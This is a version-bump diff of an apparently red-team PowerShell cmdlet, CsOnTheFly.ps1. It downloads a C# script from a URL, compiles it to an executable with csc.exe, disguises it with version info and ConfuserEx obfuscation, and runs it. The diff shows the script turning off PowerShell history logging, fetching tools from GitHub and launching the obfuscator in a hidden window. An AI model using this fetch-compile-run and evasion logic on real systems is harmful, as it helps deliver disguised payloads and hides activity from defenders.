@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: Microsoft.NET {native}
    Optional Dependencies: BitsTransfer {native}
-   PS cmdlet Dev version: v1.3.6
+   PS cmdlet Dev version: v1.3.7
 
 .DESCRIPTION
    This CmdLet downloads\compiles script.cs (To exe) and executes the binary.
@@ -98,7 +98,7 @@
 
 
 $ORIGINALURL = $null
-$cmdletversion = "1.3.6"
+$cmdletversion = "1.3.7"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
@@ -164,7 +164,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
    #>
 
 
-   If($Uri -iMatch '^(https://)' -or $Uri -iMatch '^(http://)'){## Download script.CS from network URL!
+   If($Uri -iMatch '^[http(s)]+://'){## Download script.CS from network URL sellected!
 
       If(-not($Uri -iMatch '(.cs)$')){## Make sure we are downloading a CS script!
          Write-Host "[error] Bad Uri input: This module only compiles .CS scripts!" -ForegroundColor Red -BackgroundColor Black
@@ -225,7 +225,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
       $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '(csc.exe)$' -and $_.FullName -NotMatch '(.config)$'
    }|Select-Object -Last 1 -ExpandProperty FullName 
 
-   ## Compile script to standalone executable
+   ## Compile CS script to standalone executable
    # C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:winexe /win32icon:icon.ico /out:$OutFile $Uri|Out-Null
    $RegQueryKey = "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
    $GetNetVersion = (Get-ItemProperty "$RegQueryKey" -EA SilentlyContinue).Version
@@ -255,7 +255,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
 
    }Else{## [error] Microsoft.NET framework not found!
    
-      Write-Host "[error] Microsoft.NET Compiler (csc.exe) not found!`n`n" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "[error] Not found Microsoft.NET Compiler! (csc.exe)`n`n" -ForegroundColor Red -BackgroundColor Black
       exit ## Exit @Compilecs
    
    }
@@ -291,6 +291,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
       Copyright   : ©Microsoft Corporation. All Rights Reserved
    #>
 
+
    ## Download verpatch.exe from PandoraBox repository!
    If(-not(Test-Path -Path "verpatch.exe" -ErrorAction SilentlyContinue)){
       Start-BitsTransfer -priority foreground -Source "https://raw.githubusercontent.com/r00t-3xp10it/PandoraBox/master/PandoraBox/FileDescription/verpatch.exe" -Destination "verpatch.exe" -ErrorAction SilentlyContinue|Out-Null
@@ -315,35 +316,59 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
       <#
       .SYNOPSIS
          Author: @mkaring|@r00t-3xp10it 
-         Helper - Obfuscate NET binary sourcecode
+         Helper - Obfuscate .NET applications!
 
       .NOTES
          Required dependencies: Confuser.CLI.exe {auto-download}
          Remark: ConfuserEx sometimes fail to obfuscate C# sourcecode
-         but this function will NOT brake the compiled executable if fail!
+         but this function will NOT brake the compiled executable if it fail!
+         Remark: Activate $debugging = "True" to debug ConfuserEx while working!
 
       .EXAMPLE
          PS C:\> .\CsOnTheFly.ps1 -Action Execute -Uri "$Env:TMP\script.cs" -OutFile "$Env:TMP\Installer.exe" -Obfuscate True
       #>
 
+
+      $Debugging = "False" ## Manual!
       If(-not($OutFile -Match '\\')){
+
          $BinaryName = $OutFile
          $ZipDirectory = $Working_Directory
+
       }Else{## Payload absoluct path sellected!
+
          $BinaryName = $OutFile.Split('\\')[-1]
          $ZipDirectory = $OutFile -replace "\\$BinaryName",""
+
       }
 
-      If(-not(Test-Path -Path "$ZipDirectory\ConfuserEx.zip" -ErrorAction SilentlyContinue)){## Download ConfuserEx from my github!
+      ## Download ConfuserEx from my github repository!
+      If(-not(Test-Path -Path "$ZipDirectory\ConfuserEx.zip" -ErrorAction SilentlyContinue)){
          Start-BitsTransfer -priority foreground -Source "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/ConfuserEx.zip" -Destination "$ZipDirectory\ConfuserEx.zip" -ErrorAction SilentlyContinue|Out-Null
       }
 
       If(Test-Path -Path "$ZipDirectory\ConfuserEx.zip" -EA SilentlyContinue){
+
          cd $ZipDirectory;tar.exe -x -f ConfuserEx.zip
-         Start-Process -WindowStyle Hidden -filepath "Confuser.CLI.exe" -ArgumentList "-noPause `"$BinaryName`" -out `"Obfuscated.exe`""
+
+         If($Debugging -ieq "True"){## [debug] Obfuscating .NET applications!
+
+            Write-Host "[info:] Obfuscating '$BinaryName' .NET application!" -ForegroundColor Yellow
+            Write-Host "----------------------------------------------------"
+            Start-Sleep -Seconds 1;cmd /R Confuser.CLI.exe "$BinaryName" -out "Obfuscated.exe"
+            Write-Host "----------------------------------------------------"
+
+         }Else{## [default] Obfuscating .NET applications!
+
+            Start-Process -WindowStyle Hidden -filepath "Confuser.CLI.exe" -ArgumentList "-noPause `"$BinaryName`" -out `"Obfuscated.exe`""
+
+         }
+
+         ## Make sure ConfuserEx has obfuscated the compiled application!
          If(-not(Test-Path -Path "$ZipDirectory\Obfuscated.exe" -ErrorAction SilentlyContinue)){
 
-            Write-Host "[error] ConfuserEx: fail to obfuscate '${BinaryName}' NET binary!" -ForegroundColor Red -BackgroundColor Black
+            Write-Host "[error] ConfuserEx: fail to obfuscate '${BinaryName}' appl!" -ForegroundColor Red -BackgroundColor Black
+            ## Remark: Next cmdline stops Confuser.CLI.exe background process if it have fail on is task (hang)!
             Stop-Process -Name "Confuser.CLI" -ErrorAction SilentlyContinue -Force|Out-Null
 
          }Else{## Binary successfully obfuscated!
